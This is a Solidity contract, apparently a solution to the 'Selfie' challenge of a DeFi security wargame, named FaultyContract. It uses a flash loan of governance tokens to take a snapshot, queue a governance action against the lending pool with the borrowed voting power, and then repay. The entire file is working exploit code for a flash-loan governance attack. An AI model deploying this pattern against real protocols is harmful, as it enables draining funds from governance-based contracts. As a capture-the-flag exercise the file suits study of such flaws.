// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./ISimpleGovernance.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

interface IERC20Snapshot is IERC20 {
    function snapshot() external returns (uint256);
}

contract FaultyContract is IERC3156FlashBorrower {
    uint256 public actionId;
    address public selfiePool;
    ISimpleGovernance public goverNance;

    constructor(address _selfiePool, address _goverNance) {
        selfiePool = _selfiePool;
        goverNance = ISimpleGovernance(_goverNance);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        IERC20Snapshot(token).snapshot();
        actionId = goverNance.queueAction(selfiePool, uint128(fee), data);
        IERC20Snapshot(token).approve(selfiePool, amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
